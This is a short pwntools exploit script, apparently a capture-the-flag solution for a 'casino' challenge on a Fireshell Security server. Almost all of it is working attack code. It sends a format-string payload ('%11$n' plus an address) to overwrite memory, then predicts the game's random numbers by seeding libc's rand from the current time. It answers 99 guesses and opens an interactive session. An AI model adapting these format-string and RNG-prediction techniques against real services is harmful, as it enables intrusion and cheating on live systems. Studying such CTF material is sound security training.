#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('casino')

host = args.HOST or 'challs.fireshellsecurity.team'
port = int(args.PORT or 31006)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x400AC3
continue
'''.format(**locals())

# -- Exploit goes here --

from ctypes import *
libc = CDLL("/lib64/libc.so.6")
context.terminal = ['gnome-terminal', '-e']
io = start()
io.send('aaa%11\$n\x20\x20\x60\x00\x00\x00\x00\x00')
seed = libc.time(0) // 10 + 1
libc.srand(seed)
print (seed)

for i in range(1, 99+1):
    print (i)
    io.sendafter('number:', str(libc.rand()))

io.interactive()

